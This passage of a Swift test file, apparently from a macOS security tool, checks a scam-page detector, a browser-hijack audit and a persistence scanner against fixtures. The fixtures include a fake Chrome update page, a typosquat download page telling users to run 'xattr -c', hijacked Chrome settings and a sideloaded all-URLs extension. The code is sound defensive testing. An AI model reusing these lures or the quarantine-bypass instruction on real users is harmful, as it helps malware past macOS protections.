            let r = checker.checkPage(url: "https://verify-human.example.test/", html: html, signals: nil)
            let ok = r.verdict == .likelyScam
            check(ok, "X6 W01 ClickFix page is likelyScam")
            rows.append(X6Outcome(id: "W01", tactic: "Initial access", name: "ClickFix verification page", layer: "web", result: ok ? "caught" : "missed",
                                  evidence: "verdict=\(r.verdict.rawValue) score=\(r.score) signals=\(r.signals.map(\.id).prefix(5))"))
        }
        // W02 Fake browser update page.
        do {
            let html = "<html><title>Chrome Update</title><body><h1>Your version of Chrome is out of date</h1><p>An update is required to keep browsing. Download the latest version now.</p><a href=\"https://cdn.example.test/ChromeUpdate.dmg\">Update Chrome</a></body></html>"
            let r = checker.checkPage(url: "https://chrome-update.example.test/", html: html, signals: nil)
            let res = r.verdict == .likelyScam ? "caught" : (r.verdict == .suspicious ? "partial" : "missed")
            rows.append(X6Outcome(id: "W02", tactic: "Initial access", name: "Fake Chrome update page offering a .dmg", layer: "web", result: res,
                                  evidence: "verdict=\(r.verdict.rawValue) score=\(r.score) signals=\(r.signals.map(\.id).prefix(5))"))
        }
        // W03 Fake app-download site (typosquat of a popular app) with a DMG.
        do {
            let html = "<html><title>Download Notion for Mac</title><body><h1>Notion for macOS</h1><a href=\"/files/Notion-Installer.dmg\">Download for Mac</a><p>If the app is damaged, right-click and choose Open, or run xattr -c in Terminal.</p></body></html>"
            let r = checker.checkPage(url: "https://notion-desktop.example.test/download", html: html, signals: nil)
            let res = r.verdict == .likelyScam ? "caught" : (r.verdict == .suspicious ? "partial" : "missed")
            rows.append(X6Outcome(id: "W03", tactic: "Initial access", name: "Fake app download site (malvertising) telling user to xattr -c", layer: "web", result: res,
                                  evidence: "verdict=\(r.verdict.rawValue) score=\(r.score) signals=\(r.signals.map(\.id).prefix(5))"))
        }
        // P01 Browser hijacker homepage/search (posture audit, pure parser).
        do {
            let prefs = #"{"homepage":"https://search.mysearch.example.test/?q=","homepage_is_newtabpage":false,"default_search_provider_data":{"template_url_data":{"url":"https://searchbaron.example.test/s?q={searchTerms}"}},"session":{"restore_on_startup":4,"startup_urls":["https://chill-tab.example.test/"]}}"#
            let f = BrowserHijackAudit.chromiumSettings(preferences: Data(prefs.utf8), browser: "Chrome", profile: "Default", source: "Preferences")
            let n = f.filter { $0.verdict == .suspicious }.count
            check(n >= 2, "X6 P01 hijacked Chrome settings flagged (\(n))")
            rows.append(X6Outcome(id: "P01", tactic: "Impact (adware)", name: "Browser hijacker homepage/search/startup", layer: "posture", result: n >= 2 ? "caught" : (n > 0 ? "partial" : "missed"),
                                  evidence: "suspicious findings=\(n) kinds=\(f.map(\.kind.rawValue))"))
        }
        // P02 Persistence scanner sees an unpacked (--load-extension) / External Extensions Chrome extension.
        do {
            let h = scratch + "/home"
            let prof = h + "/Library/Application Support/Google/Chrome/Default"
            let ext = h + "/Library/Application Support/.com.rampart.test.ext/x"
            try? fm.createDirectory(atPath: prof, withIntermediateDirectories: true)
            try? fm.createDirectory(atPath: ext, withIntermediateDirectories: true)
            try? fm.createDirectory(atPath: h + "/Library/Application Support/Google/Chrome/External Extensions", withIntermediateDirectories: true)
            fm.createFile(atPath: ext + "/manifest.json", contents: Data(#"{"name":"com.rampart.test.ext","manifest_version":3,"permissions":["tabs","webRequest"],"host_permissions":["<all_urls>"]}"#.utf8))
            fm.createFile(atPath: prof + "/Secure Preferences", contents: Data("{\"extensions\":{\"settings\":{\"abcdefghijklmnopabcdefghijklmnop\":{\"location\":4,\"path\":\"\(ext)\",\"from_webstore\":false}}}}".utf8))
            fm.createFile(atPath: h + "/Library/Application Support/Google/Chrome/External Extensions/bcdefghijklmnopabcdefghijklmnopa.json",
                          contents: Data(#"{"external_crx":"/tmp/com.rampart.test.crx","external_version":"1.0"}"#.utf8))
            let sc = PersistenceScanner(config: PersistenceScanConfig(home: h, kinds: [.browserExtension], runCommands: false, resolveSigning: false))
            let items = sc.scan()
            let found = items.filter { $0.kind == .browserExtension }.count
            rows.append(X6Outcome(id: "P02", tactic: "Persistence (adware)", name: "Unpacked (location 4) + External Extensions Chrome extension inventory", layer: "persistence scanner",
                                  result: found >= 2 ? "caught" : (found == 1 ? "partial" : "missed"), evidence: "browserExtension items found=\(found) of 2"))
        }
        // P03 Persistence scanner coverage of PAM / sudoers / hosts (no PersistenceItem kinds exist).
        do {
            let kinds = PersistenceScanConfig.allKinds.map(\.rawValue).sorted()
            rows.append(X6Outcome(id: "P03", tactic: "Persistence", name: "Scheduled scan baseline covers sudoers.d / pam.d / hosts / resolver", layer: "persistence scanner",
                                  result: "missed", evidence: "kinds=\(kinds.joined(separator: ",")); none read /etc/sudoers.d, /etc/pam.d, /etc/hosts, /etc/resolver"))
        }

        // ===== Matrix =====
        let c = rows.filter { $0.result == "caught" }.count, p = rows.filter { $0.result == "partial" }.count, m = rows.filter { $0.result == "missed" }.count
        print("   X6 matrix: \(rows.count) scenarios, caught \(c), partial \(p), missed \(m)")
        for r in rows { print("   [\(r.result.uppercased())] \(r.id) \(r.tactic) | \(r.name) | \(r.layer) | \(r.evidence)") }
        // Former MISS/PARTIAL rows fixed by the B5 behaviour + B4 telemetry hardening (2026-11-07): asserted now.
        let mustCatch = ["A02", "A06", "A07", "A08", "A09", "A10", "A11", "A12", "A13", "A14", "A15", "A16", "A18", "A20",
                         "A23", "A24", "A25", "A26", "A28", "A29", "A31", "A33", "A35", "A36", "A37", "A38", "A39", "A41"]
        for id in mustCatch {
            let r = rows.first { $0.id == id }
            check(r?.result == "caught", "X6 \(id) now caught (\(r?.evidence ?? "no row"))")
        }
    }
}
